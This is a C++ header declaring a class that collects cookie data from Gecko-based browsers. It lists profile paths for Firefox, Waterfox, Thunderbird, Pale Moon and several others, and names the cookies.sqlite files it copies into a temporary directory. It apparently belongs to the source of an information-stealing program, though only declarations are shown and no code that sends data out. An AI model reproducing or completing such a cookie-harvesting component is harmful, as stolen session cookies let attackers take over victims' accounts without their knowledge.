#pragma once
#include "Forwards.h"
#include "ICollector.h"
#include "iniparser.h"


class FireFoxCookiesParser : public ICollector<CookieData>
{
public:
	FireFoxCookiesParser();
	~FireFoxCookiesParser() override = default;
public:

	List<CookieData> collect_data() override;

private:	
	
	List<String> get_mozilla_browsers();
	String get_profile_dir(const String& dir_localdata);
	bool prepare_imports(String profile_dir, String& out_temp_dir);
	
	const List<String> m_gecko_list{
		R"(\Mozilla\Firefox)", R"(\Waterfox)", R"(\K-Meleon)", R"(\Thunderbird)", R"(\Comodo\IceDragon)",
		R"(\8pecxstudios\Cyberfox)", R"(\NETGATE Technologies\BlackHaw)", R"(\Moonchild Productions\Pale Moon)"
	};
	const List<String> m_required_files { "cookies.sqlite-shm", "cookies.sqlite", "cookies.sqlite-wal"};
	
	List<CookieData> m_data;
};
